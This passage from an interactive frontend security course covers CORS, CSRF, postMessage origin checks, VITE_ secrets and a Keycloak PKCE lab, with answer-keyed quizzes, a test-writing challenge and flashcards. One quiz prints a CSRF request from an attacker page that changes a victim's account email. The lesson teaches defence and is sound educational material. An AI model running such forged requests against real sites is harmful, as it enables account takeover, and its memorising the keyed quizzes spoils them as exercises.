> preflight that the server refuses. `Lax` already blocks most cross-site POSTs, but the header also covers older
> browsers, sibling subdomains (same-site!) and any endpoint someone later makes reachable by GET. A copy of the
> session id in `localStorage` hands it to every XSS payload; `Allow-Origin: *` weakens things; `GET` mutations
> are themselves a CSRF hole.
:::

## CORS from the frontend's point of view

**CORS is not a security feature you add to protect your API — it's a controlled relaxation of the browser's
same-origin policy.** By default, JavaScript on `https://app.devquest.test` may *send* a request to
`https://api.devquest.test`, but the browser won't let the script **read the response** unless the API opts in:

```http
Access-Control-Allow-Origin: https://app.devquest.test
Access-Control-Allow-Credentials: true            (only if you send cookies: fetch(url, { credentials: 'include' }))
Access-Control-Allow-Headers: Authorization, Content-Type, X-CSRF
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
```

Read that carefully: CORS controls whether the script may **read the response**, not whether the request is
**sent**. A "simple" request — `GET`/`HEAD`/`POST` with only basic headers and a form-style `Content-Type`
(`text/plain`, `application/x-www-form-urlencoded`, `multipart/form-data`) — goes straight to the server, which
executes it; the browser only hides the answer afterwards. That's why CORS is not a CSRF defence.

"Non-simple" requests (JSON bodies with `Content-Type: application/json`, an `Authorization` header, custom headers,
`PUT/DELETE`) are different: the browser first sends a **preflight** `OPTIONS` request asking "would you accept
this?", and only sends the real request if the server's CORS headers say yes. Practical consequences:

- The CORS error in your console is the **browser** protecting the user; Postman and `curl` don't care. Fix it on
  the **server** (ASP.NET Core `AddCors` with an explicit origin list), never by a "disable CORS" browser extension.
- `Allow-Origin: *` cannot be combined with credentials, and should never be used for authenticated APIs.
- In development, avoid CORS entirely with Vite's proxy (`server.proxy: { '/api': 'http://localhost:5000' }`):
  the browser sees one origin. In production, serving SPA and API from the same origin (or via the BFF) does the same.

:::quiz id=fe-25-q6 xp=15
A legacy API on `https://api.devquest.test` uses a session cookie with `SameSite=None; Secure` and sends **no** CORS
headers at all. A signed-in user, in a browser that still allows third-party cookies (Chrome's default settings),
visits a page on `https://evil.io` that runs:

```js
fetch('https://api.devquest.test/api/account/email', {
  method: 'POST',
  credentials: 'include',
  body: new URLSearchParams({ email: 'attacker@evil.io' }),
})
```

What happens?
- [ ] Nothing reaches the API — without CORS headers the browser blocks the request
- [ ] The browser sends a preflight `OPTIONS`, the API doesn't answer it correctly, so the `POST` is never sent
- [x] The `POST` is sent with the cookie and the API changes the email; the browser only hides the response from `evil.io`
- [ ] The request is sent, but the browser strips the cookie because the origins differ
> A form-encoded `POST` without custom headers is a **simple request**: no preflight, it goes straight out, and
> `SameSite=None` means the cookie is attached. CORS only decides whether `evil.io`'s script may *read* the
> answer — the damage is already done. This is classic CSRF; the fixes are `SameSite=Lax/Strict`, a required
> custom header (which *would* force a preflight) or an anti-forgery token. Cookies are scoped by site and
> `SameSite`, not stripped just because the origins differ. (Safari and Firefox block or partition third-party
> cookies by default, which happens to stop this attack there — a bonus, not a defence to rely on.)
:::

:::challenge id=fe-25-c6 lang=ts mode=tests xp=60
title: Test the origin check
Iframes, OAuth popups and widgets talk to your app via `window.postMessage`. The receiving handler **must** check
`event.origin` against an allow-list — attackers can post messages from any page. Below is the correct `isTrustedOrigin`.
Write tests that pass on it and catch three classic broken versions (prefix matching, substring matching, suffix matching).

hint: Think of `https://app.devquest.test.evil.io`, `https://evilapp.devquest.test`, `http://app.devquest.test` and `https://notapp.devquest.test`.
hint: Also prove the trusted origins themselves are accepted.

```ts impl
const TRUSTED = ['https://app.devquest.test', 'https://auth.devquest.test']

export function isTrustedOrigin(origin: string): boolean {
  return TRUSTED.includes(origin)
}
```

```ts mutant
const TRUSTED = ['https://app.devquest.test', 'https://auth.devquest.test']

export function isTrustedOrigin(origin: string): boolean {
  return TRUSTED.some((t) => origin.startsWith(t))
}
```

```ts mutant
const TRUSTED = ['https://app.devquest.test', 'https://auth.devquest.test']

export function isTrustedOrigin(origin: string): boolean {
  return TRUSTED.some((t) => origin.includes(t.replace('https://', '')))
}
```

```ts mutant
const TRUSTED = ['https://app.devquest.test', 'https://auth.devquest.test']

export function isTrustedOrigin(origin: string): boolean {
  return origin.endsWith('devquest.test')
}
```

```ts starter
test('accepts the app itself', () => {
  expect(isTrustedOrigin('https://app.devquest.test')).toBe(true)
})
```

```ts solution
test('accepts trusted origins', () => {
  expect(isTrustedOrigin('https://app.devquest.test')).toBe(true)
  expect(isTrustedOrigin('https://auth.devquest.test')).toBe(true)
})
test('rejects a trusted origin used as a prefix of an attacker domain', () => {
  expect(isTrustedOrigin('https://app.devquest.test.evil.io')).toBe(false)
})
test('rejects the wrong scheme', () => {
  expect(isTrustedOrigin('http://app.devquest.test')).toBe(false)
})
test('rejects look-alike subdomains', () => {
  expect(isTrustedOrigin('https://evilapp.devquest.test')).toBe(false)
})
```
:::

## Secrets and `VITE_` environment variables

Vite replaces `import.meta.env.VITE_*` with the literal value **at build time**. The value ends up as plain text in
`dist/assets/index-abc123.js`, downloadable by anyone. Hence the rule:

> Everything in the frontend bundle is public.

| OK in `VITE_*` | Never in `VITE_*` (or anywhere in frontend code) |
|---|---|
| API base URL, SignalR hub URL | Database connection strings |
| OIDC authority + **public** client id | OIDC **client secrets** (a SPA is a public client — it has none) |
| Feature-flag names, Sentry DSN (designed to be public) | Stripe secret keys, SendGrid/OpenAI API keys |
| Build version / commit SHA | Signing keys, admin passwords, JWT secrets |

Vite only exposes variables with the `VITE_` prefix precisely so that `DATABASE_URL` from your `.env` doesn't leak by
accident — don't defeat that by renaming secrets to `VITE_DATABASE_URL` (or by widening `envPrefix` in
`vite.config.ts`). If the frontend needs a third-party API that requires a secret, **proxy it through your
backend**, which holds the key and enforces auth and rate limits.

Common mistake: "it's only used after login" or "it's in `.env.production`, which isn't committed". Neither
matters — the value is in the built `.js` file that every visitor downloads, logged in or not. Open DevTools →
Sources, search the bundle for the value, and you'll find it.

:::quiz id=fe-25-q7 xp=10
You add `VITE_OPENAI_KEY=sk-…` to `.env.production` (git-ignored) and read it only inside a component that renders
after sign-in. Who can get the key?
- [ ] Nobody — the file is not in the repository
- [ ] Only signed-in users, because the component is behind the auth guard
- [x] Anyone who loads the site, by reading the downloaded JavaScript bundle
- [ ] Only someone with access to the CI server that runs `npm run build`
> `import.meta.env.VITE_*` is replaced with the literal string at build time, so the key ships inside a public
> `.js` file. Route guards only decide what React *renders*; the code (and every string in it, lazy chunks
> included) is still downloadable. Rotate the key and move the call behind your own API.
:::

:::pro title="Security habits seniors bring"
- `npm audit` / Dependabot / Renovate on every repo; review new dependencies (a typo-squatted package runs code at install).
- Lockfiles committed; `npm ci` in CI.
- CSP in report-only from day one, enforced before launch.
- Secret scanning (GitHub push protection, gitleaks) so a leaked key never reaches `main`.
- Threat-model new features with one question: *what if this input were written by an attacker?*
:::

:::lab id=fe-25-lab1 xp=120
title: Keycloak + PKCE sign-in for your Vite app
You need Docker, Node 22+ and a Vite + React + TS app (any app from earlier lessons). The admin password below is
a throw-away local dev value — never reuse it anywhere real.

1. Start a local Keycloak in dev mode (HTTP, in-memory database — fine for learning):

```bash
docker run --name keycloak -p 8080:8080 \
  -e KC_BOOTSTRAP_ADMIN_USERNAME=admin -e KC_BOOTSTRAP_ADMIN_PASSWORD=admin \
  quay.io/keycloak/keycloak:26.4 start-dev
```

   Wait for a log line like `Keycloak 26.4.x on JVM … started in …s. Listening on: http://0.0.0.0:8080`, then open
   http://localhost:8080 and sign in to the admin console.

2. Create the realm and the SPA client:
   - Realm dropdown (top left) → *Create realm* → name `devquest`.
   - *Clients* → *Create client* → Client ID `board-spa`. On the next page leave **Client authentication off**
     (that makes it a *public* client), keep *Standard flow* checked and uncheck *Direct access grants*.
   - *Valid redirect URIs* `http://localhost:5173/*`, *Valid post logout redirect URIs* `http://localhost:5173/*`,
     *Web origins* `http://localhost:5173` (this is Keycloak's CORS allow-list for the token endpoint).
   - Client → *Advanced* tab → *Proof Key for Code Exchange Code Challenge Method* = `S256` → Save. Now Keycloak
     *rejects* any sign-in for this client that doesn't use PKCE.

3. Create the API audience. Keycloak access tokens don't name your API by default, and the API must check `aud`:
   - *Client scopes* → *Create client scope* → name `board-api`, type *None*, *Include in token scope* on → Save.
   - In that scope: *Mappers* → *Configure a new mapper* → *Audience* → name `board-api-audience`,
     *Included Custom Audience* `board-api`, *Add to access token* on → Save.
   - *Clients* → `board-spa` → *Client scopes* → *Add client scope* → `board-api` → *Optional*.
     (The SPA requests it via `scope: '… board-api'`; requesting a scope that doesn't exist fails with
     `invalid_scope`.)
   - *Users* → *Create new user* `alice` (set email, first name **and last name**; tick *Email verified*) → *Credentials* → set a password, *Temporary* off.

4. In your app: `npm i oidc-client-ts react-oidc-context`, then create `.env.development` (public values only):

```bash
VITE_OIDC_AUTHORITY=http://localhost:8080/realms/devquest
VITE_OIDC_CLIENT_ID=board-spa
```

   Wire up the `AuthProvider` config from this lesson in `main.tsx` and render `AccountButton` somewhere visible.
   `onSigninCallback` handles the return to `/callback`; if you use React Router, add a `/callback` route that
   renders a spinner so the router doesn't show a 404 while the library finishes.

5. `npm run dev`, click *Sign in*, sign in as `alice`. In DevTools → Network (enable *Preserve log*):
   - the request to `…/protocol/openid-connect/auth?…` has `code_challenge=…&code_challenge_method=S256&state=…`,
   - the `POST …/protocol/openid-connect/token` has form fields `grant_type=authorization_code`, `code`,
     `code_verifier` and `redirect_uri`, and its JSON response contains `access_token`, `id_token`, `refresh_token`.
   Paste the access token into a JWT decoder and check that `aud` contains `board-api`.

6. Call your API with `Authorization: Bearer ${auth.user?.access_token}` and validate it in ASP.NET Core
   (`Microsoft.AspNetCore.Authentication.JwtBearer` package):

```csharp
using System.Security.Claims;
using Microsoft.AspNetCore.Authentication.JwtBearer;

// … after var builder = WebApplication.CreateBuilder(args);
builder.Services.AddAuthentication(JwtBearerDefaults.AuthenticationScheme)
    .AddJwtBearer(o =>
    {
        o.Authority = "http://localhost:8080/realms/devquest";  // discovers signing keys via .well-known
        o.Audience = "board-api";                              // must match the aud claim
        o.RequireHttpsMetadata = !builder.Environment.IsDevelopment();  // allow HTTP only for local Keycloak
        o.MapInboundClaims = false;                            // keep claim names as in the token ("name", "sub")
    });
builder.Services.AddAuthorization();
// … after building the app:
app.UseAuthentication();
app.UseAuthorization();
app.MapGet("/api/me", (ClaimsPrincipal user) => new { name = user.FindFirst("name")?.Value })
   .RequireAuthorization();
```

   Expected: `GET /api/me` with the header → `200` and `{"name":"<alice's full name>"}`; without it → `401`.
   (If you call the API from `localhost:5173` directly, add CORS for that origin — or use the Vite proxy.)

7. Add a strict CSP to the **built** app. `vite preview` can send headers from `vite.config.ts`:

```ts
export default defineConfig({
  plugins: [react()],
  preview: {
    headers: {
      'Content-Security-Policy':
        "default-src 'self'; script-src 'self'; connect-src 'self' http://localhost:8080; " +
        "frame-ancestors 'none'; object-src 'none'; base-uri 'self'",
    },
  },
})
```

   Add `http://localhost:4173/*` to the client's redirect URIs and `http://localhost:4173` to its web origins (the
   preview port), then `npm run build && npx vite preview`. (`vite preview` reuses your `server.proxy`, so `/api`
   calls stay same-origin and are covered by `'self'`; an API on another origin must be added to `connect-src`.) Sign in again: it should work, and the console should
   show **no** `Refused to …` CSP messages. Now temporarily remove `http://localhost:8080` from `connect-src`,
   restart `vite preview` (header changes need no rebuild), reload and click *Sign in*: the discovery request to
   `…/.well-known/openid-configuration` is refused with a CSP violation and sign-in never starts — that's the
   policy doing its job.

- [ ] Sign-in redirects to Keycloak and back; the UI shows the user's name
- [ ] The token request contains `code_verifier`; the authorize request contains `code_challenge` with `S256`
- [ ] The `?code=` parameter is removed from the address bar after sign-in
- [ ] The decoded access token's `aud` contains `board-api`
- [ ] `GET /api/me` with the access token returns 200, and without it returns 401
- [ ] The built app runs under the strict CSP with no CSP violations; removing Keycloak from `connect-src` breaks sign-in
- [ ] No secrets in any `VITE_` variable
:::

## Recap

- **Origin** = scheme + host + port; **site** = registrable domain. CORS and storage are per origin; `SameSite` is per site
  (cookies themselves are scoped by domain and path).
- **XSS** = attacker script in your origin. React escapes text; danger lives in `dangerouslySetInnerHTML`, URLs in
  `href`/`src`, `srcDoc`, direct DOM writes and `eval`. Sanitise HTML with **DOMPurify**; allow-list URL schemes via the URL parser.
- **CSP** limits what injected code can do: without `'unsafe-inline'`, inline scripts and `on*=` handlers don't run.
  A Vite build works with `script-src 'self'`. Roll out report-only first.
- **OIDC Authorization Code + PKCE** is the standard for SPAs; the verifier proves the code redeemer is the original app.
  Use a library (oidc-client-ts, MSAL.js), not hand-rolled OAuth.
- Tokens readable by JS are readable by XSS. Prefer memory + short lifetimes + rotation, or a **BFF** with HttpOnly cookies.
- Decoding a JWT in the client is for **UX only**; authorization decisions belong to the API that verifies the signature.
- Cookies need **CSRF** defences (SameSite + custom header / anti-forgery token); bearer headers don't.
- **CORS** is the server opting in to cross-origin *reads* — simple requests are still sent and executed, so CORS is
  not a CSRF defence. Fix CORS errors on the server, or avoid them with same-origin/proxy.
- Everything in the bundle — including every `VITE_` variable — is **public**.

:::cards id=fe-25-cards1 xp=15 title="Frontend security"
Q: Three kinds of XSS?
A: Stored (from your DB), reflected (from the request, echoed by the server), DOM-based (client code moves untrusted data into a sink).
Q: Which React APIs bypass its automatic escaping?
A: `dangerouslySetInnerHTML`, URL attributes like `href`/`src`, direct DOM access via refs (`innerHTML`), `eval`/`new Function`.
Q: Why validate URLs with an allow-list and `new URL()`?
A: Browsers normalise schemes (case, whitespace, tabs), so deny-lists are bypassable; the parser gives the real `protocol`.
Q: What does `frame-ancestors 'none'` do?
A: Forbids embedding your page in iframes — prevents clickjacking.
Q: What is PKCE in one sentence?
A: The app sends a hash of a secret verifier with the authorize request and the verifier itself with the token request, so a stolen code is useless.
Q: ID token vs access token?
A: ID token tells the client who the user is; the access token is the credential sent to the API.
Q: What is a BFF?
A: A server-side confidential OIDC client that keeps tokens off the browser and gives the SPA an HttpOnly session cookie.
Q: Why are header bearer tokens immune to CSRF?
A: A cross-site page can't make the browser attach your `Authorization` header; it only auto-attaches cookies.
Q: Is `VITE_STRIPE_SECRET_KEY` safe?
A: No — every `VITE_` value is inlined into the public JS bundle.
Q: Does a missing CORS header stop a cross-origin request from reaching the server?
A: Not for simple requests (form-style POST, GET): they're sent and executed; CORS only hides the response from the script. Non-simple requests get a preflight first.
Q: Origin vs site?
A: Origin = scheme + host + port (`https://app.x.test:443`). Site = scheme + registrable domain (`https://x.test`). `app.x.test` and `api.x.test` are cross-origin but same-site.
Q: What does the OAuth `state` parameter protect?
A: The redirect back to your app: a callback whose `state` doesn't match what you stored is rejected, so an attacker can't inject their own sign-in.
:::
